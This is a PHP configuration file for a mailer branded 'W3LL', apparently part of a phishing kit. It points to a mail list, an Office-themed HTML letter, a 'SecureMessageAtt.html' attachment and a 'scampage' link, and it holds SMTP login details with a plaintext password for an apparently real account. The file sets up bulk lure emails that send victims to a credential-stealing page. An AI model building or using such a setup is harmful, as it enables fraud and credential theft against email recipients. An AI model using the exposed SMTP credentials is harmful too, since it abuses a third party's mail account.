<?php

/* W3LL MAIL_LIST SETUP */

$mail_list = "file/W3LL_MAILLIST/W3LL_MAIL.txt"; //Your mail list file name | don't change file/W3LL_LETTER/

/* W3LL MAIL_LIST SETUP */

/* W3LL LETTER SETUP */

$msg_file = "file/W3LL_LETTER/OFFICE.html"; //Your attachment file name | don't change file/W3LL_LETTER/

/* W3LL LETTER SETUP */

/* W3LL ATTACHMENT SETUP */

$attachment = "SecureMessageAtt.html"; //Name of your attachment

/* W3LL ATTACHMENT SETUP */

$scampage = [


		"https://google.com", // Your scampage link

];

/* W3LL SMTP SETUP */

$smtp_acc = [

["host" => "secure.emailsrvr.com","port" => "465","username" => "werner@c3invest.com","password" => "Bogey@88Keys"],


/* example 

//dont change bellow

["host" => "secure.emailsrvr.com","port" => "465","username" => "werner@c3invest.com","password" => "Bogey@88Keys"],

*/

];


/* W3LL SMTP SETUP */

?>